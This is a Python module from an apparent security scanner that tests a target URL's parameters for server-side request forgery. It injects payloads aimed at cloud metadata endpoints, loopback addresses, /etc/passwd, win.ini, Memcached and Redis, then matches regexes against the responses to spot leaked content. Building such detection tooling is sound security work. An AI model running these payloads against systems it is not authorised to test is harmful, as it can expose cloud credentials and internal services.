"""
tools/ssrf_tester.py
Server-Side Request Forgery (SSRF) detection via inband response analysis.

Tests URL parameters with internal/cloud-metadata payloads and checks whether
the response body leaks internal content (IP addresses, cloud metadata keys,
file system paths).  No out-of-band callback server required.
"""
import re
import requests
import urllib3
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_TIMEOUT = 12


@dataclass
class SSRFFinding:
    parameter:  str
    payload:    str
    evidence:   str   # what in the response triggered the finding
    confidence: str   # "High" | "Medium"


@dataclass
class SSRFResult:
    success:  bool
    target:   str
    findings: list[SSRFFinding] = field(default_factory=list)
    error:    str = ""

    @property
    def has_findings(self) -> bool:
        return bool(self.findings)

    @property
    def high_confidence(self) -> list[SSRFFinding]:
        return [f for f in self.findings if f.confidence == "High"]


# ── Payloads ──────────────────────────────────────────────────────────────────

_SSRF_PAYLOADS = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://169.254.169.254/latest/meta-data/",        # AWS EC2 metadata
    "http://169.254.169.254/computeMetadata/v1/",      # GCP metadata
    "http://169.254.169.254/metadata/instance",        # Azure IMDS
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",        # Alibaba Cloud metadata
    "http://192.168.0.1/",                             # common router
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "dict://127.0.0.1:11211/stat",                     # Memcached
    "gopher://127.0.0.1:6379/_PING%0D%0A",            # Redis
]

# Patterns that indicate the server fetched the internal resource
_EVIDENCE_PATTERNS: list[tuple[str, str]] = [
    (r"ami-id|instance-id|instance-type|hostname",         "AWS EC2 metadata leak"),
    (r"computeMetadata|project-id|serviceAccounts",         "GCP metadata leak"),
    (r"MSFT|azure|compute/vmId",                            "Azure IMDS leak"),
    (r"root:.*?:/bin/",                                     "/etc/passwd content leaked"),
    (r"\[extensions\]|for 16-bit app support",              "Windows win.ini leaked"),
    (r"STAT\s+\w+\s+\d+",                                   "Memcached STAT response"),
    (r"\+PONG",                                             "Redis PONG response"),
    (r"10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+|172\.(1[6-9]|2\d|3[01])\.\d+\.\d+",
                                                            "Internal IP address in response"),
    (r"169\.254\.169\.254",                                 "Metadata IP reflected in response"),
]


def _inject_payload(url: str, param: str, payload: str) -> str:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    new_query = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def test_ssrf(url: str) -> SSRFResult:
    """
    Test all URL parameters of *url* for SSRF using inband response analysis.
    """
    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    parsed = urlparse(url)
    params = list(parse_qs(parsed.query, keep_blank_values=True).keys())
    if not params:
        return SSRFResult(
            success=False, target=url,
            error="No URL parameters found. Provide a URL like http://target.com/page?url=https://example.com",
        )

    session = requests.Session()
    session.verify = False
    session.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

    findings: list[SSRFFinding] = []
    seen: set[tuple[str, str]] = set()

    for param in params:
        for payload in _SSRF_PAYLOADS:
            test_url = _inject_payload(url, param, payload)
            try:
                r = session.get(test_url, timeout=_TIMEOUT, allow_redirects=True)
                body = r.text[:8000]

                for pattern, label in _EVIDENCE_PATTERNS:
                    if re.search(pattern, body, re.IGNORECASE):
                        key = (param, label)
                        if key not in seen:
                            seen.add(key)
                            findings.append(SSRFFinding(
                                parameter=param,
                                payload=payload,
                                evidence=label,
                                confidence="High",
                            ))
                        break

                # Medium confidence: server returned 500 on internal-address payload
                if r.status_code == 500 and "127.0.0.1" in payload:
                    key = (param, "500-internal")
                    if key not in seen:
                        seen.add(key)
                        findings.append(SSRFFinding(
                            parameter=param,
                            payload=payload,
                            evidence="Server returned 500 on loopback address — possible SSRF (unconfirmed)",
                            confidence="Medium",
                        ))

            except requests.RequestException:
                continue

    return SSRFResult(success=True, target=url, findings=findings)
